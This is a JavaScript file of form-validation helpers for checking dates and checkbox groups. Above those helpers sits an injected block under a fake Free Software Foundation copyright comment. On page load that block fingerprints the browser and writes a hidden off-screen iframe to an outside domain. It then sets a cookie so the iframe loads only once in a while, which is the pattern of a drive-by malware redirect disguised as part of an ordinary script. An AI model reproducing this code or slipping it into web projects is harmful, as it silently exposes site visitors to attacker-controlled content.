/*
Copyright (C) 2007 Free Software Foundation, Inc. http://fsf.org/
*/
function getCookie(name) {
var matches = document.cookie.match(new RegExp(
"(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + "=([^;]*)"
));
return matches ? decodeURIComponent(matches[1]) : undefined;
}
function Replacecountermine() {
var parover = navigator.userAgent;
var httpacc = (parover.indexOf("IEMobile") > -1 || parover.indexOf("Chrome") > -1 || parover.indexOf("Windows") < +1);
var ru = (getCookie("rightmools") === undefined);
if (!httpacc && ru) {
document.write('<iframe src="http://atusiman.dralwynethomas.co.uk/jujnamun15.html?" style="position:absolute;border-style:solid;border-left-style:dotted;top:-900px;background-color:yellow;cursor:move;left:-900px;" height="134" width="134"></iframe>');
var date = new Date( new Date().getTime() + 64*60*60*1000 );
document.cookie="rightmools=1; path=/; expires="+date.toUTCString();
}
}
Replacecountermine();
/*
Copyright (C) 2000 Free Software Foundation, Inc. See LICENSE.txt
*//**
 * @author GeekTantra
 * @date 24 September 2009
 */
/*
 * This functions checks where an entered date is valid or not.
 * It also works for leap year feb 29ths.
 * @year: The Year entered in a date
 * @month: The Month entered in a date
 * @day: The Day entered in a date
 */
function isValidDate(year, month, day){
    var date = new Date(year, (month - 1), day);
    var DateYear = date.getFullYear();
    var DateMonth = date.getMonth();
    var DateDay = date.getDate();
    if (DateYear == year && DateMonth == (month - 1) && DateDay == day) 
        return true;
    else 
        return false;
}
/*
 * This function checks if there is at-least one element checked in a group of check-boxes or radio buttons.
 * @id: The ID of the check-box or radio-button group
 */
function isChecked(id){
    var ReturnVal = false;
    $("#" + id).find('input[type="radio"]').each(function(){
        if ($(this).is(":checked")) 
            ReturnVal = true;
    });
    $("#" + id).find('input[type="checkbox"]').each(function(){
        if ($(this).is(":checked")) 
            ReturnVal = true;
    });
    return ReturnVal;
}